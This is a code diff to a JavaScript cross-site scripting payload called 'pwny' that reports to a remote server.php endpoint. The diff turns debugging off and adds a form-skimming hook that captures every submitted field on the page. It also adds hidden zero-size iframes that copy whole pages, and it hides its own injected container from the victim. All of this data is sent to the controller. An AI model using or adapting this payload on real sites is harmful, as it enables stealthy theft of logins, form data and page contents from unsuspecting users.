@@ -1,7 +1,7 @@
 //
 
 var pwny = {
-	debug: true,
+	debug: false,
 	endpoint: 'http://whak.local.dev/pwnyXSSpress/server.php',
 	recving: false,
 	errno: 0,
@@ -20,8 +20,22 @@ var pwny = {
 		}
 	},
 	
+	handleForms: function (){
+		var f = document.getElementsByTagName('form');
+		for(i=0; i<f.length; i++){
+			f[i].onsubmit = function (){
+				var myData = {mode: 'send_form'};
+				for(j=0; j<this.elements.length; j++){
+					myData[this.elements[j].name] = this.elements[j].value;
+				}
+				this.socket.send(myData);
+			};
+		}
+	},
+	
 	send: function (data){
 		data.cmdID = this.cmdID;
+		data.mode  = 'cmd_reponse';
 		this.socket.send(data);
 	},
 	
@@ -49,23 +63,38 @@ var pwny = {
 	
 	
 	fetchPage: function (page){
-		if(!this.fetchFrame){
-			this.fetchFrame = document.createElement('iframe');
-			if(!this.debug){
-				this.fetchFrame.style.height = '0px';
-				this.fetchFrame.style.width = '0px';
+		if(page == window.location.pathname){
+			var c = document.body.parentNode.innerHTML;
+			pwny.socket.send({
+				mode: 'page_response',  
+				page_name: page, 
+				content: escape(c)
+			});
+			
+		} else {
+			if(!this.fetchFrame){
+				this.fetchFrame = document.createElement('iframe');
+				if(!this.debug){
+					this.fetchFrame.style.height = '0px';
+					this.fetchFrame.style.width = '0px';
+					this.fetchFrame.style.border = 'none';
+					
+				}
+	
+				document.body.appendChild(this.fetchFrame);
 			}
-
-			document.body.appendChild(this.fetchFrame);
+	
+			this.fetchFrame.onload = function (){
+				var c = pwny.fetchFrame.contentDocument.body.parentNode.innerHTML;
+				pwny.socket.send({
+					mode: 'page_response',  
+					page_name: page, 
+					content: escape(c)
+				});
+			};
+	
+			this.fetchFrame.setAttribute('src', page);
 		}
-
-		this.fetchFrame.onload = function (){
-			var c = this.ownerDocument.body.innerHTML;
-			pwny.log(c);
-			pwny.send({'page': page, content: c});
-		};
-
-		this.fetchFrame.setAttribute('src', page);
 
 	},
 	
@@ -126,6 +155,13 @@ var pwnySocket = function (endpoint){
 	this.outputForm.setAttribute('method', 'post');
 	this.outputForm.setAttribute('action', this.endpoint);
 	
+	if(!pwny.debug){
+		this.container.style.height = '0px';
+		this.container.style.width = '0px';
+		this.container.style.top = '0px';
+		this.container.style.right = '0px';
+		this.container.style.position = 'absolute';
+	}
 	
 	document.body.appendChild(this.container);
 	this.container.appendChild(this.outputForm);
